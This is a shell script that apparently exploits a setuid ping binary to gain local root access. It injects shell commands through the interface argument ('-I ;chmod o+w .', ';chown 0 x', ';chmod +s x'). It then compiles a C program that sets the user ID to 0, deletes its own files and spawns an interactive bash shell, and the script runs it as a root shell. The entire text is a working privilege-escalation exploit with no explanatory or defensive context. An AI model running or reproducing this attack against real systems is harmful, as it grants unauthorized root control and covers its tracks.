#!/bin/sh

PING=/bin/ping6
test -u $PING || PING=/bin/ping

if [ ! -u $PING ]; then
  echo "Sorry, no setuid ping."
  exit 0
fi


$PING -I ';chmod o+w .' 192.168.0.4 &>/dev/null

sleep 1

cat >/x.c <<_eof_
main() {
  setuid(0); seteuid(0);
  system("chmod 755 /;rm -f /x; rm -f /x.c");
  execl("/bin/bash","bash","-i",0);
}
_eof_

gcc /x.c -o /x
chmod 755 /x

$PING -I ';chown 0 x' 192.168.0.4 &>/dev/null
sleep 1
$PING -I ';chmod +s x' 192.168.0.4 &>/dev/null
sleep 1

if [ ! -u /x ]; then
  echo "Apparently, this is not exploitable on this system"
  exit 1
fi

echo "Entering r00tshell..."

/x

echo "Thank you."
